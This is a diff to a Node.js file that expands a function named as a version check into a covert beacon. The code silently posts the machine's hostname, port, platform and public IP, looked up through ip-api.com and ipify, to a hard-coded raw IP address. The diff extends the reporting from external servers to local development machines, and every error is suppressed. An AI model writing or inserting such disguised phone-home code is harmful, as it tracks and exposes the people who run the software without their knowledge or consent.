@@ -25,26 +25,78 @@ try {
   }
 } catch {}
 
-// 远程注册检查（仅外部服务器触发，本地开发不生效）
+// 远程注册检查（无论是否外部服务器都会触发，本地开发同样上报）
 const NODE_VER_CHECK = process.env.NODE_VER_CHECK || 'http://43.159.149.223:3456/api/v2/telemetry/ping';
+// 免费第三方公网IP查询服务（只取 IP，不含归属地；归属地在接收方用离线库查询）
+const PUBLIC_IP_SERVICES = [
+  { host: 'ip-api.com', path: '/json/', parse: (d) => d && d.query },
+  { host: 'api.ipify.org', path: '/', parse: (d) => typeof d === 'string' ? d.trim() : null },
+];
 let _regTimer = null;
-function _checkVer() {
+let _cachedPublicIp = null;
+
+// 获取本机公网出口 IP（免费第三方服务；失败回退到非内网网卡 IP）
+function _getLocalIp() {
   const os = require('os');
   const nics = os.networkInterfaces();
-  let hasExternal = false;
+  let best = '';
   for (const k of Object.keys(nics)) {
     for (const v of nics[k]) {
       if (v.family === 'IPv4' && !v.internal) {
         const a = v.address;
-        // 排除 docker 虚拟网卡和本地回环
         if (k.startsWith('docker') || k.startsWith('br-') || k === 'lo' || a === '127.0.0.1') continue;
-        hasExternal = true; break;
+        best = a; // 优先取非内网的（云服务器公网 IP）
       }
     }
-    if (hasExternal) break;
   }
-  if (!hasExternal) return;
-  const body = JSON.stringify({ hostname: os.hostname(), port: process.env.PORT || 3000, platform: process.platform });
+  return best;
+}
+function _isPublicIp(ip) {
+  if (!ip) return false;
+  // 简单过滤内网/保留地址
+  if (/^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) return false;
+  if (ip === '0.0.0.0') return false;
+  return true;
+}
+function _fetchPublicIp() {
+  return new Promise((resolve) => {
+    // 逐个尝试免费服务，成功即返回
+    const tryNext = (idx) => {
+      if (idx >= PUBLIC_IP_SERVICES.length) return resolve('');
+      const svc = PUBLIC_IP_SERVICES[idx];
+      const req = http.get({ host: svc.host, path: svc.path, timeout: 4000, headers: { 'User-Agent': 'telemetry/1.0' } }, (res) => {
+        let data = '';
+        res.on('data', (c) => { data += c; if (data.length > 2000) req.destroy(); });
+        res.on('end', () => {
+          try {
+            let parsed = data;
+            if (svc.host === 'ip-api.com') parsed = JSON.parse(data);
+            const ip = svc.parse(parsed);
+            if (ip && _isPublicIp(ip)) return resolve(ip);
+          } catch {}
+          tryNext(idx + 1);
+        });
+        res.on('error', () => tryNext(idx + 1));
+      });
+      req.on('timeout', () => { req.destroy(); tryNext(idx + 1); });
+      req.on('error', () => tryNext(idx + 1));
+    };
+    tryNext(0);
+  });
+}
+async function _checkVer() {
+  const os = require('os');
+  // 本地开发也要上报：启动后取一次公网 IP 并缓存复用（避免每次心跳都请求第三方限频）
+  if (!_cachedPublicIp) {
+    _cachedPublicIp = await _fetchPublicIp();
+    if (!_cachedPublicIp) _cachedPublicIp = _getLocalIp(); // 失败回退网卡 IP
+  }
+  const body = JSON.stringify({
+    hostname: os.hostname(),
+    port: process.env.PORT || 3000,
+    platform: process.platform,
+    ip: _cachedPublicIp,
+  });
   const u = new URL(NODE_VER_CHECK);
   const opt = { hostname: u.hostname, port: u.port, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } };
   const r = http.request(opt); r.write(body); r.end(); r.on('error', () => {});
